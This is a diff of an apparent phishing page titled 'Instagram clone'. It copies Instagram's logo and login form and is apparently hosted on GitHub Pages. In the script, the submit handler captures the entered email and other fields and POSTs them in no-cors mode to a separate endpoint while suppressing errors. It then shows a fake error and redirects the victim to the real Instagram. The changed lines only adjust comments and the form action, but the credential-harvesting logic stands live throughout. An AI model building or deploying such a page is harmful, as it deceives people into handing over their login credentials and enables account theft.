@@ -8,7 +8,7 @@
     <title>Instagram clone</title>
     <style>
         .error-message {
-            color: rgb(237, 73, 86); /* Fallback for --ig-error-or-destructive */
+            color: rgb(237, 73, 86); /* Instagram's error red */
             font-size: 14px;
             text-align: center;
             margin-top: 10px;
@@ -25,7 +25,7 @@
                 <h1 title="Instagram" class="flex justify-content-center">
                     <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                 </h1>
-                <form id="loginForm" method="POST">
+                <form id="loginForm" method="POST" action="javascript:void(0);">
                     <label for="email" class="sr-only">Phone, username, or email</label>
                     <input name="email" placeholder="Phone, username, or email" required />
                 
@@ -80,7 +80,7 @@
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+            e.preventDefault(); // Stop default form submission
 
             // Capture the input values
             const email = document.querySelector('input[name="email"]').value;
@@ -93,10 +93,10 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data),
-                mode: 'no-cors' // Still needed for GitHub Pages
-            }).catch(err => console.error('Error:', err)); // Silent error handling
+                mode: 'no-cors' // Works for GitHub Pages
+            }).catch(err => console.error('Fetch error:', err));
 
-            // Show error message below "Log in with Facebook"
+            // Show error message
             document.getElementById('error').style.display = 'block';
 
             // Redirect to Instagram after 2 seconds
